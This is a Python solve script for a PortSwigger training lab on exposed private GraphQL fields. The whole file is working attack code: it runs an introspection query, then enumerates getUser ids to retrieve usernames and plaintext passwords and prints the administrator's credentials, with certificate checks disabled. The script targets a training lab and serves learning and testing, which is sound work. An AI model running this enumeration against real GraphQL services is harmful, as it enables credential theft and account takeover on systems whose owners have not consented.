#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Accidental exposure of private GraphQL fields.

1. Run introspection to find sensitive fields on the User type.
2. Query getUser(id: X) with those fields to retrieve admin credentials.
3. Log in as administrator.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INTROSPECTION_QUERY = {"query": "query { __schema { types { name fields { name } } } }"}

USER_QUERY = """
query getUser {
    getUser(id: %d) {
        id
        username
        password
    }
}
"""


def run_introspection(lab, session_cookie):
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    cookies = {"session": session_cookie}
    r = requests.post(
        f"{lab}/graphql/v1",
        json=INTROSPECTION_QUERY,
        headers=headers,
        cookies=cookies,
        verify=False,
    )
    types = r.json().get("data", {}).get("__schema", {}).get("types", [])
    print("[*] Types with fields:")
    for t in types:
        fields = t.get("fields") or []
        if fields:
            field_names = [f["name"] for f in fields]
            print(f"    {t['name']}: {field_names}")
    return types


def find_admin(lab, session_cookie, max_id=10):
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    cookies = {"session": session_cookie}
    for user_id in range(1, max_id + 1):
        payload = {"query": USER_QUERY % user_id, "operationName": "getUser"}
        r = requests.post(
            f"{lab}/graphql/v1",
            json=payload,
            headers=headers,
            cookies=cookies,
            verify=False,
        )
        data = r.json().get("data", {}).get("getUser")
        if not data:
            continue
        print(f"[{user_id}] username={data.get('username')!r}  password={data.get('password')!r}")
        if data.get("username") == "administrator":
            print(f"\n[+] Admin credentials — username: administrator  password: {data.get('password')}")
            return data
    return None


def main():
    parser = argparse.ArgumentParser(
        description="Solve Accidental Exposure of Private GraphQL Fields lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session", help="session cookie value")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    print("[*] Running introspection...")
    run_introspection(lab, args.session)
    print("\n[*] Enumerating users for admin credentials...")
    find_admin(lab, args.session)


if __name__ == "__main__":
    main()
